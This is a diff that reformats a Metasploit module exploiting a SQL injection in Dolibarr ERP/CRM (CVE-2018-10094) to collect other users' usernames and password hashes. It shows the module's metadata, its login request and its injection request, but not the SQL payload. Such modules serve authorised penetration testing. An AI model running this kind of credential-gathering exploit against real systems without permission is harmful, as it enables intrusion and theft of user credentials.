@@ -7,39 +7,48 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Dolibarr Gather Credentials via SQL Injection',
-      'Description'    => %q{
-         This module enables an authenticated user to collect the usernames and
-         encrypted passwords of other users in the Dolibarr ERP/CRM via SQL
-         injection.
-      },
-      'Author'         => [
-                            'Issam Rabhi',  # PoC
-                            'Kevin Locati', # PoC
-                            'Shelby Pace',  # Metasploit Module
-                          ],
-      'License'        => MSF_LICENSE,
-      'References'     => [
-                            [ 'CVE', '2018-10094' ],
-                            [ 'EDB', '44805']
-                          ],
-      'DisclosureDate' => '2018-05-30'
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Dolibarr Gather Credentials via SQL Injection',
+        'Description' => %q{
+          This module enables an authenticated user to collect the usernames and
+          encrypted passwords of other users in the Dolibarr ERP/CRM via SQL
+          injection.
+        },
+        'Author' => [
+          'Issam Rabhi', # PoC
+          'Kevin Locati', # PoC
+          'Shelby Pace',  # Metasploit Module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'CVE', '2018-10094' ],
+          [ 'EDB', '44805']
+        ],
+        'DisclosureDate' => '2018-05-30',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, 'The base path to Dolibarr', '/' ]),
         OptString.new('USERNAME', [ true, 'The username for authenticating to Dolibarr', 'admin' ]),
         OptString.new('PASSWORD', [ true, 'The password for authenticating to Dolibarr', 'admin' ])
-      ])
+      ]
+    )
   end
 
   def check_availability
     login_page = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')
     res = send_request_cgi(
-      'method'  =>  'GET',
-      'uri'     =>  normalize_uri(login_page)
+      'method' => 'GET',
+      'uri' => normalize_uri(login_page)
     )
 
     return false unless res && res.body.include?('Dolibarr')
@@ -55,15 +64,15 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Logging in...")
 
     login_res = send_request_cgi(
-       'method'  =>  'POST',
-       'uri'     =>  login_uri,
-       'cookie'  =>  cookies,
-       'vars_post' =>  {
-         'username'  =>  datastore['USERNAME'],
-         'password'  =>  datastore['PASSWORD'],
-         'loginfunction' =>  'loginfunction'
-       }
-     )
+      'method' => 'POST',
+      'uri' => login_uri,
+      'cookie' => cookies,
+      'vars_post' => {
+        'username' => datastore['USERNAME'],
+        'password' => datastore['PASSWORD'],
+        'loginfunction' => 'loginfunction'
+      }
+    )
 
     unless login_res && login_res.body.include?('id="mainmenua_members"')
       fail_with(Failure::NoAccess, "Couldn't log into Dolibarr")
@@ -81,13 +90,13 @@ class MetasploitModule < Msf::Auxiliary
     inject_uri <<= cmd
 
     inject_res = send_request_cgi(
-      'method'  =>  'GET',
-      'uri'     => normalize_uri(inject_uri),
-      'cookie'  => cookies
+      'method' => 'GET',
+      'uri' => normalize_uri(inject_uri),
+      'cookie' => cookies
     )
 
     unless inject_res && inject_res.body.include?('id="searchFormList"')
-     fail_with(Failure::NotFound, "Failed to access page. The user may not have permissions.")
+      fail_with(Failure::NotFound, "Failed to access page. The user may not have permissions.")
     end
 
     print_good("Accessed credentials")
